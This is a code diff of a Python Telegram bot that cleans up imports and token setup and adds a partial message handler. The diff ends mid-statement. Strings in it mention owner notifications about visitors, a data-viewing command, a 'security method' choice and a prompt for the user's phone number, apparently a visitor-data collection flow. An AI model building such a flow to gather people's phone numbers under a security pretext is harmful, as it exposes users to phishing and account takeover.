@@ -3,16 +3,17 @@ import json
 import logging
 import re
 import random
+import time
+import asyncio
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 # ===== CONFIGURATION =====
-BOT_TOKEN = BOT_TOKEN = os.environ.get("BOT_TOKEN")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
 
 # YOUR TELEGRAM USER ID (get it from @userinfobot)
-# Replace this with your actual Telegram user ID
-OWNER_ID = "6623024700"  # Get this from @userinfobot
+OWNER_ID = "6623024700" 
 
 # Get the current directory
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -156,12 +157,7 @@ async def send_visitor_notification(visitor_data):
 🔗 *View Data:* /view_data
         """
         
-        # Send to owner
-        application = None
-        # We'll use a global reference to send messages
-        # This will be set in the main function
-        
-        # For now, log it
+        # Log it
         logger.info(f"Visitor notification: {message}")
         
         # Store in global for later sending
@@ -332,7 +328,6 @@ Choose your preferred security method:
             parse_mode='Markdown'
         )
         
-        import asyncio
         await asyncio.sleep(1)
         await start(update, context)
     
@@ -492,7 +487,6 @@ Type your phone number in the chat.
             parse_mode='Markdown'
         )
         
-        import asyncio
         await asyncio.sleep(1)
         await start(update, context)
     
@@ -556,8 +550,12 @@ Block or unblock users from accessing the bot.
             [InlineKeyboardButton("🔙 Back", callback_data="block_visitor")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await que
-if __name__ == "__main__":
-    import time
-    time.sleep(5)
-    application.run_polling()
+        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
+
+# ===== MESSAGE HANDLER =====
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text
+    
+    if is_user_blocked(user_id):
+        
